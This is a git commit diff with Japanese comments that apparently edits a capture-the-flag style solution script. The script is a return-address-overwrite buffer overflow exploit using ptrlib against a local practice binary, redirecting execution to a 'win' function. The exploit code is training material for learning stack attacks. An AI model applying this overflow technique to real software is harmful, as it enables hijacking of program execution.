66a955db4aca6a1691b63cc8360fbebd82b8510a
Shun Ota <peloeil20@gmail.com>
2025-04-22 22:01:24 +0900

    chore: bof.py

--- answers/00-stack/bof.py
+++ answers/00-stack/bof.py
@@ -1,25 +1,28 @@
 from ptrlib import *
 
+
 def main():
     elf = ELF("./chall")
     proc = Process("./chall")
 
-    # -fno-pie なので関数のアドレスがすぐわかる
+    # -no-pie なので関数のアドレスがすぐわかる
     addr_win = elf.symbol("win")
 
     # buf を埋めたあと、saved rip を win に書き換えれば良い
     buf_size = 30
-    stack_size = (buf_size + 15) // 16 * 16 # buf_size 以上で最小の 16 の倍数
+    stack_size = 0x20
 
-    payload = b"A" * 29 + b"\0" # buf を埋める(puts で読みすぎないように \0 を入れる)
-    payload += b"B" * (stack_size - buf_size) # 余りを埋める
-    payload += b"0" * 0x8 # saved rbp を埋める
-    payload += p64(addr_win + 1) # return address を win 関数のアドレスに書き換える(movaps で死ぬので push rbp を飛ばす)
-    payload += b"\n"
+    payload = b"A" * (buf_size - 1) + b"\0"  # buf を埋める
+    payload += b"B" * (stack_size - buf_size)  # 余りを埋める
+    payload += b"0" * 0x8  # saved rbp を埋める
+    payload += p64(
+        addr_win + 1
+    )  # return address を win 関数のアドレスに書き換える(movaps で死ぬので push rbp を飛ばす)
 
-    proc.send(payload)
+    proc.sendline(payload)
     proc.interactive()
     return
+
 
 if __name__ == "__main__":
     main()
